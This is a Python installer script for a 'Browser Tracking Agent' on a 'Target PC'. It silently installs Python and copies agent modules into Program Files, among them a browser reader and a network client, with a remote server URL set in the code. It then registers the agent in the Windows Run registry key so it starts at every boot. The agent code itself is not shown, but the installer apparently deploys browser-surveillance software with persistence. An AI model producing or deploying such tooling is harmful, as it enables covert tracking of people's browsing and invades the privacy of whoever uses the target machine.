"""
Browser Tracking Agent - Full Installer for Target PC
Automatically installs Python, dependencies, and sets up the agent
"""

import os
import sys
import subprocess
import urllib.request
import zipfile
import shutil
import json
import time
from pathlib import Path

class BrowserTrackingInstaller:
    def __init__(self):
        self.install_dir = os.path.join(os.environ.get('PROGRAMFILES', 'C:\\Program Files'), 'BrowserTracker')
        self.python_url = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe"
        self.python_installer = "python_installer.exe"
        self.server_url = "https://browser-tracking.vercel.app"
        
    def log(self, message):
        """Log installation progress"""
        timestamp = time.strftime("%H:%M:%S")
        print(f"[{timestamp}] {message}")
        
    def check_admin(self):
        """Check if running as administrator"""
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def check_python(self):
        """Check if Python is installed and return path"""
        try:
            result = subprocess.run([sys.executable, '--version'],
                                  capture_output=True, text=True)
            if result.returncode == 0:
                version = result.stdout.strip()
                self.log(f"Python found: {version}")
                return sys.executable
        except:
            pass

        # Try common Python paths
        python_paths = [
            "python",
            "python3",
            "C:\\Python311\\python.exe",
            "C:\\Python310\\python.exe",
            "C:\\Python313\\python.exe",
            "C:\\Users\\%USERNAME%\\AppData\\Local\\Programs\\Python\\Python311\\python.exe",
            "C:\\Users\\%USERNAME%\\AppData\\Local\\Programs\\Python\\Python313\\python.exe"
        ]

        for path in python_paths:
            try:
                result = subprocess.run([path, '--version'],
                                      capture_output=True, text=True)
                if result.returncode == 0:
                    self.log(f"Python found at: {path}")
                    return path
            except:
                continue

        return None
    
    def download_python(self):
        """Download Python installer"""
        self.log("Downloading Python installer...")
        try:
            urllib.request.urlretrieve(self.python_url, self.python_installer)
            self.log("Python installer downloaded successfully")
            return True
        except Exception as e:
            self.log(f"Error downloading Python: {e}")
            return False
    
    def install_python(self):
        """Install Python silently"""
        self.log("Installing Python...")
        try:
            cmd = [
                self.python_installer,
                "/quiet",
                "InstallAllUsers=1",
                "PrependPath=1",
                "Include_test=0",
                "Include_doc=0",
                "Include_dev=0",
                "Include_debug=0",
                "Include_launcher=1",
                "InstallLauncherAllUsers=1"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                self.log("Python installed successfully")
                # Wait for installation to complete
                time.sleep(10)
                return True
            else:
                self.log(f"Python installation failed: {result.stderr}")
                return False
        except Exception as e:
            self.log(f"Error installing Python: {e}")
            return False
    
    def create_directories(self):
        """Create installation directories"""
        try:
            os.makedirs(self.install_dir, exist_ok=True)
            os.makedirs(os.path.join(self.install_dir, "logs"), exist_ok=True)
            self.log(f"Created installation directory: {self.install_dir}")
            return True
        except Exception as e:
            self.log(f"Error creating directories: {e}")
            return False
    
    def copy_agent_files(self):
        """Copy agent files to installation directory"""
        self.log("Copying agent files...")

        # Get current script directory
        script_dir = os.path.dirname(os.path.abspath(__file__))

        # Files to copy
        files_to_copy = [
            "enhanced_agent.py",
            "browser_reader.py",
            "network_client.py",
            "system_info.py",
            "logger.py",
            "config.json",
            "requirements.txt"
        ]

        # Try multiple source directories
        possible_source_dirs = [
            os.path.join(script_dir, "agent_files"),
            os.path.join(script_dir, "vercel_client_configs"),
            "vercel_client_configs",
            "agent_files"
        ]

        source_dir = None
        for dir_path in possible_source_dirs:
            if os.path.exists(dir_path):
                source_dir = dir_path
                break

        if not source_dir:
            self.log("Error: Agent files directory not found")
            return False
        
        try:
            for file in files_to_copy:
                source = os.path.join(source_dir, file)
                dest = os.path.join(self.install_dir, file)
                
                if os.path.exists(source):
                    shutil.copy2(source, dest)
                    self.log(f"Copied: {file}")
                else:
                    self.log(f"Warning: {file} not found")
            
            return True
        except Exception as e:
            self.log(f"Error copying files: {e}")
            return False
    
    def install_dependencies(self):
        """Install Python dependencies"""
        self.log("Installing dependencies...")

        # Find Python executable
        python_exe = self.check_python()
        if not python_exe:
            self.log("Error: Python executable not found")
            return False

        self.log(f"Using Python: {python_exe}")

        try:
            # Install pip if not available
            subprocess.run([python_exe, "-m", "ensurepip", "--default-pip"],
                         capture_output=True)

            # Install requirements
            requirements_file = os.path.join(self.install_dir, "requirements.txt")
            if os.path.exists(requirements_file):
                self.log(f"Installing from requirements file: {requirements_file}")
                result = subprocess.run([
                    python_exe, "-m", "pip", "install", "-r", requirements_file
                ], capture_output=True, text=True)

                if result.returncode == 0:
                    self.log("Dependencies installed successfully from requirements.txt")
                    return True
                else:
                    self.log(f"Error installing from requirements.txt: {result.stderr}")

            # Install individual packages as fallback
            self.log("Installing individual packages as fallback...")
            packages = ["requests"]  # sqlite3 is built-in
            for package in packages:
                self.log(f"Installing {package}...")
                result = subprocess.run([
                    python_exe, "-m", "pip", "install", package
                ], capture_output=True, text=True)

                if result.returncode == 0:
                    self.log(f"Successfully installed {package}")
                else:
                    self.log(f"Error installing {package}: {result.stderr}")

            self.log("Dependencies installation completed")
            return True
        except Exception as e:
            self.log(f"Error installing dependencies: {e}")
            return False
    
    def create_startup_script(self):
        """Create startup script"""
        self.log("Creating startup script...")
        
        startup_script = f"""@echo off
cd /d "{self.install_dir}"
python enhanced_agent.py --start
"""
        
        script_path = os.path.join(self.install_dir, "start_agent.bat")
        try:
            with open(script_path, 'w') as f:
                f.write(startup_script)
            self.log("Startup script created")
            return script_path
        except Exception as e:
            self.log(f"Error creating startup script: {e}")
            return None
    
    def setup_windows_startup(self):
        """Setup Windows startup"""
        self.log("Setting up Windows startup...")
        
        try:
            import winreg
            
            # Registry path for startup
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            
            # Add startup entry
            startup_script = os.path.join(self.install_dir, "start_agent.bat")
            winreg.SetValueEx(key, "BrowserTracker", 0, winreg.REG_SZ, startup_script)
            winreg.CloseKey(key)
            
            self.log("Windows startup configured")
            return True
        except Exception as e:
            self.log(f"Error setting up startup: {e}")
            return False
    
    def test_installation(self):
        """Test the installation"""
        self.log("Testing installation...")

        try:
            agent_path = os.path.join(self.install_dir, "enhanced_agent.py")
            python_exe = self.check_python()

            if not python_exe:
                self.log("Cannot test installation - Python executable not found")
                return False

            # Test agent
            self.log(f"Testing with Python: {python_exe}")
            self.log(f"Testing agent: {agent_path}")

            result = subprocess.run([
                python_exe, agent_path, "--test"
            ], capture_output=True, text=True, cwd=self.install_dir, timeout=30)

            if result.returncode == 0:
                self.log("Installation test successful")
                if result.stdout:
                    self.log(f"Test output: {result.stdout.strip()}")
                return True
            else:
                self.log(f"Installation test failed (exit code: {result.returncode})")
                if result.stderr:
                    self.log(f"Test error: {result.stderr.strip()}")
                if result.stdout:
                    self.log(f"Test output: {result.stdout.strip()}")
                return False
        except subprocess.TimeoutExpired:
            self.log("Installation test timed out")
            return False
        except Exception as e:
            self.log(f"Error testing installation: {e}")
            return False
    
    def cleanup(self):
        """Cleanup installation files"""
        try:
            if os.path.exists(self.python_installer):
                os.remove(self.python_installer)
                self.log("Cleanup completed")
        except:
            pass
    
    def install(self):
        """Main installation process"""
        self.log("=== Browser Tracking Agent Installation ===")
        
        # Check admin privileges
        if not self.check_admin():
            self.log("Warning: Not running as administrator. Some features may not work.")
        
        # Check Python
        python_exe = self.check_python()
        if not python_exe:
            self.log("Python not found. Installing Python...")
            if not self.download_python():
                self.log("Failed to download Python installer")
                return False

            if not self.install_python():
                self.log("Failed to install Python")
                return False

            # Re-check Python after installation
            python_exe = self.check_python()
            if not python_exe:
                self.log("Python installation failed - executable not found")
                return False
        
        # Create directories
        if not self.create_directories():
            return False
        
        # Copy agent files
        if not self.copy_agent_files():
            return False
        
        # Install dependencies
        if not self.install_dependencies():
            return False
        
        # Create startup script
        if not self.create_startup_script():
            return False
        
        # Setup Windows startup
        self.setup_windows_startup()
        
        # Test installation
        if not self.test_installation():
            self.log("Installation completed but test failed")
        
        # Cleanup
        self.cleanup()
        
        self.log("=== Installation Completed Successfully ===")
        self.log(f"Installation directory: {self.install_dir}")
        self.log("Agent will start automatically on next boot")
        self.log("To start now, run: start_agent.bat")
        
        return True

def main():
    installer = BrowserTrackingInstaller()
    
    print("Browser Tracking Agent - Full Installer")
    print("=" * 50)
    
    try:
        success = installer.install()
        if success:
            print("\n✅ Installation completed successfully!")
            print(f"📁 Installed to: {installer.install_dir}")
            print("🚀 Agent will start automatically on next boot")
            
            # Ask to start now
            response = input("\nStart agent now? (y/n): ")
            if response.lower() == 'y':
                startup_script = os.path.join(installer.install_dir, "start_agent.bat")
                subprocess.Popen(startup_script, shell=True)
                print("✅ Agent started!")
        else:
            print("\n❌ Installation failed!")
            
    except KeyboardInterrupt:
        print("\n⚠️ Installation cancelled by user")
    except Exception as e:
        print(f"\n❌ Installation error: {e}")

if __name__ == "__main__":
    main()
